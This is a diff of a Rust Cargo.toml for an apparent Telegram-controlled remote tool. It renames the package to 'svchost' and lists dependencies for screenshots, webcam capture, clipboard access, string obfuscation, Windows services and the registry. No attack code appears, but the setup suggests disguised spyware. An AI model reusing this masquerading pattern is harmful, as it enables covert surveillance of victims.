@@ -1,33 +1,36 @@
 [package]
-name = "tg-remote-bot"
-version = "0.1.0"
+name = "svchost"
+version = "1.1.0"
 edition = "2024"
 
 [dependencies]
-teloxide       = { version = "0.17", features = ["macros"] }
-tokio          = { version = "1.50.0", features = ["full"] }
-sha2           = "0.10.9"
-hex            = "0.4.3"
-screenshots    = "0.8.10"
-sysinfo        = "0.38.4"
-image          = "0.25.10"
-log            = "0.4.29"
-env_logger     = "0.11.9"
-nokhwa         = { version = "0.10.10", features = ["input-native"] }
-reqwest        = { version = "0.13.2", features = ["stream"] }
-obfstr         = "0.4.4"
-base64         = "0.22.1"
-anyhow         = "1.0.102"
+teloxide = { version = "0.17", features = ["macros"] }
+tokio = { version = "1.50.0", features = ["full"] }
+sha2 = "0.10.9"
+hex = "0.4.3"
+screenshots = "0.8.10"
+sysinfo = "0.38.4"
+image = "0.25.10"
+log = "0.4.29"
+fern = "0.7"
+chrono = "0.4"
+nokhwa = { version = "0.10.10", features = ["input-native"] }
+reqwest = { version = "0.13.2", features = ["stream"] }
+obfstr = "0.4.4"
+base64 = "0.22.1"
+anyhow = "1.0.102"
 
 [build-dependencies]
-dotenvy        = "0.15"
+dotenvy = "0.15"
+winres = "0.1"
 
 [target.'cfg(windows)'.dependencies]
 windows-service = "0.8"
-winreg          = "0.56"
-clipboard-win  = "5.4.1"
-windows-sys    = { version = "0.61.2", features = [
+winreg = "0.56"
+clipboard-win = "5.4.1"
+windows-sys = { version = "0.61.2", features = [
     "Win32_UI_WindowsAndMessaging",
+    "Win32_Storage_FileSystem",
     "Win32_System_Services",
     "Win32_Security_Cryptography",
     "Win32_Foundation",
@@ -39,11 +42,11 @@ windows-sys    = { version = "0.61.2", features = [
     "Win32_NetworkManagement_Ndis",
     "Win32_Networking_WinSock",
     "Win32_System_WindowsProgramming",
-]}
+] }
 
 [profile.release]
-opt-level     = 3
-strip         = true
-lto           = true
+opt-level = 3
+strip = true
+lto = true
 codegen-units = 1
-panic         = "abort"
+panic = "abort"
